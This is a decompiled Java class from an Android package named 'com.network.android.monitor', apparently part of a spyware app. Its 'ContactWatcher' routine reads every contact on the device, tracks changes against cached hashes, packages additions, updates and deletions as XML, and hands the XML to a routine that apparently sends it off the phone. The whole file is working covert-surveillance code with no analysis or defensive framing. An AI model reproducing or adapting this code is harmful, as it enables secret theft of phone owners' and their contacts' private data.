package com.network.android.monitor.observer;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.util.Xml;
import com.network.android.SmsReceiver;
import com.network.android.c.a.a;
import com.network.android.j;
import com.network.android.m;
import java.io.StringWriter;
import java.util.Date;
import java.util.HashSet;
import org.xmlpull.v1.XmlSerializer;

/* access modifiers changed from: package-private */
public final class k implements Runnable {

    /* renamed from: a  reason: collision with root package name */
    final /* synthetic */ ContentResolver f96a;
    final /* synthetic */ Context b;

    k(ContentResolver contentResolver, Context context) {
        this.f96a = contentResolver;
        this.b = context;
    }

    public final void run() {
        int i;
        boolean z;
        try {
            boolean unused = i.g = true;
            String gMTString = new Date().toGMTString();
            a.a("scanContacts scan starting " + gMTString);
            Cursor query = this.f96a.query(i.b, null, null, null, null);
            if (query.getCount() > 0) {
                try {
                    HashSet<String> hashSet = new HashSet(i.e.keySet());
                    XmlSerializer newSerializer = Xml.newSerializer();
                    StringWriter stringWriter = new StringWriter();
                    Context context = this.b;
                    SmsReceiver.a(newSerializer, stringWriter);
                    newSerializer.startTag("", "contacts");
                    int i2 = 0;
                    boolean z2 = false;
                    while (query.moveToNext()) {
                        try {
                            i.d();
                            if (i.d % 35 == 0) {
                                Thread.sleep(3);
                            }
                            StringBuilder sb = new StringBuilder();
                            String a2 = i.a(this.f96a, query, sb);
                            if (!(a2 == null || i.e == null)) {
                                String sb2 = sb.toString();
                                Integer num = (Integer) i.e.get(a2);
                                if (num != null) {
                                    hashSet.remove(a2);
                                    if (sb2.hashCode() != num.intValue()) {
                                        a.a("ContactWatcher updatevCard update- " + sb2);
                                        i.e.put(a2, Integer.valueOf(sb2.hashCode()));
                                        StringBuilder sb3 = new StringBuilder();
                                        m.a(this.f96a, query, sb3);
                                        a.a("ContactWatcher updatevCard Vcard update- " + sb3.toString());
                                        m.a(newSerializer, "update", a2, sb3.toString());
                                        i2++;
                                        z2 = true;
                                    }
                                } else {
                                    a.a("ContactWatcher add contact " + gMTString);
                                    i.e.put(a2, Integer.valueOf(sb2.hashCode()));
                                    StringBuilder sb4 = new StringBuilder();
                                    m.a(newSerializer, "add", m.a(this.f96a, query, sb4), sb4.toString());
                                    i = i2 + 1;
                                    z = true;
                                    z2 = z;
                                    i2 = i;
                                }
                            }
                            i = i2;
                            z = z2;
                            z2 = z;
                            i2 = i;
                        } catch (Throwable th) {
                            a.a("add, update task Exception- " + th.getMessage(), th);
                        }
                    }
                    if (query == null || query.isClosed()) {
                        a.b("readCalendar finally - cursor was closed");
                    } else {
                        query.close();
                    }
                    if (z2) {
                        a.a("ContactWatcher sending contacts add/update: " + i2);
                        newSerializer.endTag("", "contacts");
                        SmsReceiver.a(newSerializer);
                        j.a(this.b, stringWriter.toString(), (String[]) null, (byte[][]) null);
                    }
                    try {
                        if (hashSet.size() > 0) {
                            i.d();
                            if (i.d % 35 == 0) {
                                Thread.sleep(3);
                            }
                            XmlSerializer newSerializer2 = Xml.newSerializer();
                            StringWriter stringWriter2 = new StringWriter();
                            Context context2 = this.b;
                            SmsReceiver.a(newSerializer2, stringWriter2);
                            newSerializer2.startTag("", "contacts");
                            for (String str : hashSet) {
                                m.a(newSerializer2, "delete", str, (String) null);
                                i.e.remove(str);
                            }
                            newSerializer2.endTag("", "contacts");
                            SmsReceiver.a(newSerializer2);
                            j.a(this.b, stringWriter2.toString(), (String[]) null, (byte[][]) null);
                        }
                    } catch (Throwable th2) {
                        a.a("remove task Exception- " + th2.getMessage(), th2);
                    }
                } catch (Throwable th3) {
                    a.a("get contacts Exception- " + th3.getMessage(), th3);
                }
            }
            a.a("ContactWatcher scan finish " + gMTString);
            boolean unused2 = i.g = false;
            g.f92a = false;
        } catch (Throwable th4) {
            a.a("Scan contacts Exception- " + th4.getMessage(), th4);
        }
    }
}
